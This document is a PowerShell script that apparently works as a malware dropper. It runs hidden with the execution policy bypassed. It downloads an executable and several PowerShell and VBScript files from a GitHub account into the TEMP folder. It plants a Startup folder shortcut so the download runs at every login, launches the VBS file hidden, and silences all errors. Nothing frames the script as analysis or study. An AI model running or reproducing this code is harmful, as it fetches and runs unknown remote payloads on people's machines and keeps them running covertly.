cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"

# Define storage paths
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$tempPath = "$env:TEMP"

# Create directories if they don't exist
If (!(Test-Path -Path $startupPath)) {
    New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
}

If (!(Test-Path -Path $tempPath)) {
    New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
}

# Download Startup.exe to Temp
try {
    $startupFile = "$tempPath\Startup.exe"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/Startup.exe" `
        -OutFile $startupFile -ErrorAction Stop | Out-Null
} catch {}

# Create Shortcut in Startup Folder
try {
    $WScriptShell = New-Object -ComObject WScript.Shell
    $shortcut = $WScriptShell.CreateShortcut("$startupPath\Startup.lnk")
    $shortcut.TargetPath = $startupFile
    $shortcut.WorkingDirectory = $tempPath
    $shortcut.WindowStyle = 1
    $shortcut.Description = "Startup Application"
    $shortcut.Save()
} catch {}

# Download runtime.ps1
try {
    $runtimeFile = "$tempPath\runtime.ps1"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/runtime.ps1" `
        -OutFile $runtimeFile -ErrorAction Stop | Out-Null
} catch {}

# Download pydata.ps1
try {
    $pydataFile = "$tempPath\pydata.ps1"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/Project/raw/refs/heads/main/DLLs/pst.ps1" `
        -OutFile $pydataFile -ErrorAction Stop | Out-Null
} catch {}

# Download python.vbs to Temp
try {
    $vbsFile = "$tempPath\python.vbs"
    Invoke-WebRequest -Uri "https://github.com/KevinDark5/data/raw/refs/heads/main/python.vbs" `
        -OutFile $vbsFile -ErrorAction Stop | Out-Null
} catch {}

# Create Shortcut for python.vbs in Temp
try {
    $vbsShortcut = $WScriptShell.CreateShortcut("$tempPath\python.lnk")
    $vbsShortcut.TargetPath = $vbsFile
    $vbsShortcut.WorkingDirectory = $tempPath
    $vbsShortcut.WindowStyle = 1
    $vbsShortcut.Description = "Python VBS"
    $vbsShortcut.Save()
} catch {}

# Execute the shortcut
try {
    Start-Process -FilePath "$tempPath\python.lnk" -WindowStyle Hidden
} catch {}